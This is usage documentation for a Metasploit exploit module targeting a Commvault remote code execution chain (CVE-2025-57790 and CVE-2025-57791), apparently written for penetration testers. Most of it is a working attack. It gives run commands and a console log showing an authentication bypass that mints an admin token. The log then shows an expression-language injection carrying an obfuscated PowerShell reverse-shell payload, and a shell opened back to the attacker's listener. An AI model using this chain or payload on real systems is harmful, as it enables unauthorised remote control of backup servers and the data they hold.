## Vulnerable Application
This module exploits an unauthenticated remote code execution exploit chain for Commvault,
tracked as CVE-2025-57790 and CVE-2025-57791. A command-line injection permits unauthenticated
access to the 'localadmin' account, which then facilitates code execution via expression
language injection. This module executes in the context of 'NETWORK SERVICE' on Windows.

## Testing
To set up a test environment:
1. Install Commvault and perform basic minimum setup (prompted by installer).
2. Confirm that the web service on port 443 is reachable.
3. Follow the verification steps below.

## Options
The `HOSTNAME` option, which is necessary for the localadmin user authentication bypass, can be set (optional, will attempt to autodetect).

## Verification Steps
1. Start msfconsole
2. `use exploit/multi/http/commvault_rce_cve_2025_57790_cve_2025_57791`
3. `set RHOSTS <TARGET_IP_ADDRESS>`
4. `set RPORT <TARGET_PORT>`
5. `run`

## Scenarios
### Commvault Windows Target
```
msf exploit(multi/http/commvault_rce_cve_2025_57790_cve_2025_57791) > set LHOST 192.168.154.139
LHOST => 192.168.154.139
msf exploit(multi/http/commvault_rce_cve_2025_57790_cve_2025_57791) > set RHOSTS 192.168.154.163
RHOSTS => 192.168.154.163
msf exploit(multi/http/commvault_rce_cve_2025_57790_cve_2025_57791) > set AutoCheck false
AutoCheck => false
msf exploit(multi/http/commvault_rce_cve_2025_57790_cve_2025_57791) > set verbose true
verbose => true
msf exploit(multi/http/commvault_rce_cve_2025_57790_cve_2025_57791) > run
[*] Started reverse TCP handler on 192.168.154.139:4444 
[!] AutoCheck is disabled, proceeding with exploitation
[*] Attempting to query the publicLink.do endpoint
[*] The server returned a body that included the string WebConsoleURL, looks like Commvault
[*] System host name value for authentication bypass: DC01
[*] Attempting to mint a localadmin token using hostname: DC01
[+] Successfully bypassed authentication
[*] Admin token: QSDK 32d2ec790ca77e5f507583e520476ed956f9c205b9b3b6e8b4b5e3d0934592f33514a30461c3cde75b36e20a525875fc177f789362c156cf8d09518579436941b87572fb562318e693396fbf5bda6a23185cfd57eb7aaeb6d9445ec656d0be622a63e7bbe679489eb725a73e1861cb110f4c6376d589191d14def673c6ed467d7cb98ff4b703db957c7c398c8c560412a3aaf29a4306e63715129ef05bda2815e7be3035f689fb9676f474169f038641912869b1f6496a0c05d607038d17023a9cb135981fa271105df765cb717d949da48b6a1bd6a0be13515060b65211371dabe120e9ce26a90bb6ca315edf1944bf3b151146c210b5207
[*] Extracted localadmin user ID number: 4
[*] Uploading XML file: <App_GetUserPropertiesRequest level="30">
	<user userName="DC01_localadmin__" /></App_GetUserPropertiesRequest>
[*] Updating user description: <App_UpdateUserPropertiesRequest><users><AppMsg.UserInfo><userEntity><userId>4</userId></userEntity><description>${''.getClass().forName('java.util.Scanner').getConstructor(''.getClass().forName('java.io.InputStream')).newInstance(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('powershell -w hidden -nop -e YwBtAGQALgBlAHgAZQAgAC8AYwAgACcAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBuAG8AbgBpACAALQBlAHAAIABiAHkAcABhAHMAcwAgACIAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEARwA5AEsAdAAyAGcAQwBBADUAVgBWAFgAVwAvAGIATgBoAFIAOQA5ADYAKwA0AE0ATgBSAEcAUQBtAHoAQwA5AHIAcABoAEQAWgBDAGkAbgBwAG8ATwBBAGIATABXAHEATABMAGwAdwBUAEEAUQBtACcAJwArACcAJwByAHEATwB0AGQAQwBrAFMAMQBLAHgAagBjAFQALwBmAGEAUgB7ADEAfQBmAFQAaABPAHMASgBZAFAAdABzAGgANwBlAFgAaAA0ADcAaQBHADUAeQBBAFUAegBtAFIAVAB3AEoANQByACsARABjADQAWgB6ADEAQQBZADYARAB4ADIAdwBMAFoAJwAnACsAJwAnAGcAdwArAEEAYwB2AHUAQwBtAC8AMwBYACsATAB6AEkARAAvAGUAdgBkAEcAcgAvAFEARgBkAHAAQgAnACcAKwAnACcAUQAyAHgAKwBYAE8AUgBYAHkAZQBSAHYAagBaADkAdwBRAFgATgB1AFkAbwBXAHAAagBXAFMAVQBhAHcAcwBSAEcASgAnACcAKwAnACcAVgBqAG4AVABWAFIAYwByAHMAagB6AHoATABzAGUARwB1AGsAeQB1ADMAcwBPADQAdQBLADQAbABwAHUAVQBOAG0AZQBaAFEAZABGAGYAewAxAH0ASQBWAFgAWQBYAGwAOQB6AFEAeABLAGgATgAzAHMAeQAnACcAKwAnACcAQwBXAHEAeABVAFYAYQBlADkAdwBOAE4ARwBjAFMAZgBGAHMAOABKAFAAYwBDAEMANQBwAFcAbwB4AEcASABsAE4ASgBoAGwAcQBEAEYAMgBBAGwAewAyAH0ANQB5AGoASQAvAGcAeABqAEsAQgBNAHkAUgBZAFEAVgBzAHQAQQBIADcAOQBEAGQANQA2AEoAdABCAHMAVgB3AFgASgBlAE0AWgBkAG4AMgBxAEIAQQBaAFMAZABQAGsANQAzADkAWABoAEcAbgBXAGkATABaAFAAUgBwAE4AcgB0AG4ANgB5AG0AZgBNADMAdABsADIAUABKAEYAbwBRADUAVgB4ADYALwBxAFYAaQA2AGcAdgB7ADIAfQBYAGsAcgBiADgAdwBZAHIAbwB7ADIAJwAnACsAJwAnAH0ARgBMAE0AcwBSAGwAbABUADIAcgA5AEYAVgArAEkAQgBLADQAegBIAGoARwByAHAAVgA4AHAAZQBZAHgAeAAnACcAKwAnACcATwAvAFUASABmADQAZgBrAFMARwB2AC8AMQBPAGgAcgAnACcAKwAnACcAKwArAEkAOABOAGYAMwBuAGQANwBiAGkAZAArACsAVQA0AHAAbwBUAFkASwA2AGMAcgB4AEwAZQBHAEoAdABWAHAAUwBqAEYAbQBlAEQAYwBPAHkAUQBpAFYAQgA1ADUAYQB1AEwAewAyAH0AaQBMAG4AdABZADgAcQBjAEIAZQBZAFkAZwBzAFYANQBuACcAJwArACcAJwBaAGsAYQBSAEsARABmADMANgB2AFcAQgBoAGIAWQBXADkAOABEAEcANAB0AHUAaAA3ADYARgBNAE4AewAyAH0ANABNADUAMwAzAEEAbABEAGMAYQBvAFQATABiAEkARwBEAFgANABEACsAVgBaAFMAcAAzADMAWQBzAHIANQBuAEwATAA3AFcAUgBTADkAUQBJAGUATQBjADcATgB7ADIAfQB4AG4AVwBUAHgAdgBwAFYAYgBRAEsAUgBjADkANwByAEcAcQA2AEgAbwA2ADQAbgAxAE0AYQByAGgAVwBvADIAMgBsAFoAeQBPAHQAOABaAG4ATQA1AG0AZwBmAHQAMwBsAGgAdwBRAE0AaAByAFkAOQB2AFQAbQBjAGIARAAzAFkAcQBOAEkAcQAzAEEANABOAGIAZwAxAEIAQQBXAFQAcQBmAFAANwAyAGQAawA0AGkAUwA4AHYASQAxAGUAQQBQADEAeABPADIATAAyAHgAeABwAFUAYgBEAFIATgAzAHQASgBJAGwAYwBnADQAcQBGADgASgBtAGcANQBVAG4AMQA5AGEAOABYAFQAaQBGAEEATQBYAEQAbQBlAHMASgBkAC8AUgBQADcAWgBpAHQAVgBCADEAZwBjAHIAWABPAFQAUgBPADgARgBiAEYAYwA3ACcAJwArACcAJwAxAFIAMgB0AHoAUQBRAHgAaABIADgAbABUAHsAMQB9AGwAdABWAHcAWQBpAEsAVgBhAFMAMQBVAG8AUwBtAEQAcwBGAG4ATgBKAEcAaABSAGEANwBBAGQATQB5AGEAMgA0AEYAZAA2AFcAWABnADUAeQBZADIAdQBEAFkAYgBPAHgAMwBxAEQAWABkAE0AZwBWAGkAagB1AHoAYgBQAHUAbwBPAHQAUgB0AEoAeAB7ADIAfQBaADYAZQBkAFUAbQBwADcATwA0AE0AcABDAE8AbABuADgAaABVAEIAcQBuAGoALwBQAHQAWgByADEAVwBhAG8ATAB5AHAAYQBXAGMAdwBrAEsAbQBhAGcAdgBuAEMAYQByAG8AZQAxAGEAZQBIAEIAUABSADYAVABhAGIAWABtAGwAVgBVAGoAUgB7ADIAfQA2AFYANABrAFAAZgBZAHYAOQBpAHUAcgBiAGIAYQA2AGwAMgBqADcATgB1AFcAMgBpAHcAegBqAG0AewAxAH0AWQBaAEkAWAByAHkAawAxACcAJwArACcAJwA4AFEANQBxAEcAcABjAGQANgBNAE8AaABCAGMATQBBACsAZwByADUAQQBHAEIAeABKAGUAdQBIAHsAMgB9AHcALwBUAGEAYQB2AG4AYQBrACsASABQAHEAVQBzAGgAaABjAFkAWABYAHYATQBHAHgAWgA0ADIANgBxAGkAewAyAH0AewAyAH0AUAB4ADEAVQBlAHkAdQB7ADEAfQBoAFcAQwBMAEgAcABXAFQAWABzADQAWABUAEcAUAA5AGcAMwA5ADYAdQBvAHIAdwBVAGMAZgAzAGcANwBoAEMAYgA3AG0AcABsACsAaQBnAGoAZgBQAEEAZABRAEkAQwBrAHsAMQB9AHEANABGAE0ANABtAFMAUgB3AFkAdgA4AEwALwAnACcAKwAnACcAYQA4AGsASwB6AHcAYwBrAFEAawAxAFMAeABmADkAQQBDAGMATgB5AE4AWQBSAEMAVgBBAHAAcQBhAGEARAAyAGMARgBpAEwAZABaAEYAbgBEAEMATwBWAEkAWABSAFMAdwB6AE8AMgB4ADEANwAxAEwAYQBkAFkAdwBQAC8AawBIADgAYgBtAFAAOQAxAGIATgB1AHcAUgAzADYAdAA1AG4AegBtAHUAVgA3AFcAcgA2AEcALwBlAFAAegAnACcAKwAnACcAZABIAG4ATwBwAHsAMgB9AGUAKwBuAE8ASQA3AFYARwA5AFUAMgBUAFAATgB3AEoAVQBhAHUAcQA5AGYASwAvADEAcABuADEAZwA5ADkAWABUAHYALwBZAHYAewAyAH0ASABkAFcAcQA5AEsAcQA0AEkAQQBBAEEAewAwAH0AJwAnACkALQBmACcAJwA9ACcAJwAsACcAJwBFACcAJwAsACcAJwAwACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACIAJwA=').getInputStream()).useDelimiter('%5C%5CA').next()}</description></AppMsg.UserInfo></users></App_UpdateUserPropertiesRequest>
[*] Powershell session session 1 opened (192.168.154.139:4444 -> 192.168.154.163:50819) at 2025-09-02 14:53:48 -0500
^C
[-] run: Interrupted
msf exploit(multi/http/commvault_rce_cve_2025_57790_cve_2025_57791) > sessions -i 1
[*] Starting interaction with 1...

PS C:\Program Files\Commvault\ContentStore\Apache\bin> whoami
nt authority\network service

```
